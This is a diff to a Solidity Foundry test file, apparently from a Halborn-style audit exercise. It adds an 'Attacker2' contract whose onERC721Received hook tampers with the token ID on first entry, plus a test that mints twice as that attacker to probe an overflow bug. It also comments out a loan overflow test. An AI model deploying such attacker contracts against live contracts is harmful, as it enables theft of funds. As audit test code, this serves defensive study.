@@ -65,6 +65,42 @@ abstract contract Attacker is IERC721ReceiverUpgradeable {
     );
 }
 
+contract Attacker2 is IERC721ReceiverUpgradeable {
+
+    bool public enter = true;
+
+    constructor() {
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external override returns (bytes4) {
+
+        console.log("Entering onERC721Received function in Attack2 contract");
+        if (enter) {
+            enter = false;
+            tokenId = type(uint256).max;
+        }
+
+        // Log the receipt of the ERC721 token
+        emit ERC721Received(operator, from, tokenId, data);
+
+        // Return the ERC721_RECEIVED selector as per ERC721 standard
+        return IERC721ReceiverUpgradeable.onERC721Received.selector;
+    }
+    
+    // Event to log the receipt of the ERC721 token
+    event ERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes data
+    );
+}
+
 contract HalbornTest is Test {
     // Declaring 2 addresses to test
     address public immutable ALICE = makeAddr("ALICE");
@@ -117,6 +153,15 @@ contract HalbornTest is Test {
 
         token.setLoans(address(loans));
 
+    }
+
+    function testmintBuyWithETHOverflow() public {
+        Attacker2 attacker2 = new Attacker2();
+        vm.startPrank(address(attacker2));
+        vm.deal(address(attacker2), 2 ether);
+        nft.mintBuyWithETH{value: 1 ether}();
+        nft.mintBuyWithETH{value: 1 ether}();
+        vm.stopPrank();
     }
 
     /*function testnftMintAirdrops() public {
@@ -188,7 +233,7 @@ contract HalbornTest is Test {
     }*/
 
     // Test returnLoan Vulnerability
-    function testReturnLoanIntegerOverflow() public {
+    /*function testReturnLoanIntegerOverflow() public {
         vm.startPrank(BOB);
         vm.deal(BOB, 2 ether);
         nft.setApprovalForAll(address(loans), true);
@@ -199,7 +244,7 @@ contract HalbornTest is Test {
         vm.expectRevert();
         loans.getLoan(2 ether);
         vm.stopPrank();
-    }
+    }*/
 
     
 }
